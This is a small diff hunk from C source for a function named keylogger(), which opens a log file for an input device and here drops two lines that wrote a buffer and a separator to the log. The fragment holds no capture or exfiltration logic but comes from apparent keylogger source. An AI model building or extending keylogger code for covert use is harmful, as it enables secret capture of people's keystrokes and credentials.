@@ -46,9 +46,6 @@ void *keylogger(char *deviceFile)
         error("fopen()\nFonction : keylogger()");
         pthread_exit(NULL);
     }
-    
-    fputs(buffer, file_log);
-    fputs(" :\n\n", file_log);
 
     printf("deviceFile : %s\n\n", deviceFile);
 
